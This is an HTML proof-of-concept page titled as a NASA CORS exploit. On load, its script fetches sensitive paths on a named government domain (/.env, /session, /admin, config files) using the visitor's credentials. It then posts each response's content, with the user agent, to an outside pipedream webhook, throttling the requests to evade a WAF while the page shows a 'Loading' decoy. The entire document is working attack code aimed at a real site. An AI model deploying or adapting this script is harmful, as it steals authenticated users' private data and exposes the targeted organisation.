<!DOCTYPE html>
<html>
<head>
  <title>NASA CORS Exploit PoC</title>
  <script>
    (async () => {
      const webhook = "https://eojzzzf3qvc4t0o.m.pipedream.net"; // ← Webhook الخاص بك
      const origin = location.origin;
      const userAgent = navigator.userAgent;

      const targets = [
        "/",
        "/user",
        "/modules",
        "/session",
        "/api",
        "/api/v1",
        "/config.js",
        "/data.json",
        "/dashboard",
        "/.env",
        "/login",
        "/settings",
        "/js/app.js",
        "/admin",
        "/js/main.js",
        "/home",
        "/profile"
      ];

      for (let path of targets) {
        try {
          const url = "https://usgeo.gov" + path;
          const res = await fetch(url, {
            method: "GET",
            mode: "cors",
            credentials: "include"
          });

          const contentType = res.headers.get("content-type") || "";
          let content;

          if (contentType.includes("application/json")) {
            content = await res.json();
          } else if (contentType.includes("text") || contentType.includes("html") || contentType.includes("javascript")) {
            content = await res.text();
          } else {
            content = "[Non-text content]";
          }

          await fetch(webhook, {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
              origin,
              userAgent,
              url,
              status: res.status,
              content: content.slice(0, 1000) // لا ترسل أكثر من 1000 حرف
            })
          });

          console.log(`[✅] Fetched ${url} - Status: ${res.status}`);
        } catch (err) {
          await fetch(webhook, {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
              origin,
              userAgent,
              url: "https://usgeo.gov" + path,
              status: 0,
              error: err.message || "Unknown Error"
            })
          });

          console.log(`[❌] Failed: ${path} — ${err.message}`);
        }

        await new Promise(r => setTimeout(r, 1000)); // Delay to avoid WAF blocking
      }
    })();
  </script>
</head>
<body>
  <h1>Loading... Please wait</h1>
</body>
</html>
